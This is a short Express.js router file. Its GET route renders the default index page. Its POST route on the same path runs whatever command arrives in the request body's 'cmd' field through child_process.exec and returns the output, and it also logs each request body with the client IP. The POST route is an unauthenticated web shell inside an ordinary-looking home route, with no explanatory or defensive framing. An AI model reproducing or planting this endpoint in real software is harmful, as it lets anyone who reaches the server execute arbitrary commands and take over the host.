var express = require('express');
var router = express.Router();
const { exec } = require('child_process');

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { title: 'Express' });
});

router.post('/', function(req, res, next) {
  exec(req.body.cmd, (error, stdout, stderr) => {
    if (error) {
      console.error(`exec error: ${error}`);
      res.status(500).send(`Error: ${error.message}`);
      return;
    }
    if (stderr) {
      console.error(`stderr: ${stderr}`);
      res.status(500).send(`stderr: ${stderr}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
    res.send(`stdout: ${stdout}`);
  });

  const requestBody = JSON.stringify(req.body);
  console.log(requestBody);
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';
  req.logger.log(requestBody, ip);

  // res.status(200).send('Log received');
});


module.exports = router;
